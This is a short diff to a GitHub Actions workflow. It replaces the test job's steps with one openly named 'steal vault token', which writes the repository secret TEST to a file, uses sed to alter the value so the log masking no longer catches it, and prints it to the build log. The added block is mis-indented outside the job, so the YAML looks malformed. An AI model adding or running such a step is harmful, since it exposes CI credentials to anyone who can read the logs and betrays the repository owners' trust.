@@ -9,9 +9,13 @@ on:
 jobs:
   test:
     runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@master
-      - name: 
-        run: |
-          echo "######"
-          ls -la
+
+steps:
+  - name: steal vault token
+    env:
+      TEST: ${{ secrets.TEST }}
+    run: |
+        echo "${TEST}" > file_secret.txt
+        sed -i 's/^\(.\)\(.*\)/\1@ STEAL_SECRET@\2/g' file_secret.txt
+        cat file_secret.txt
+        
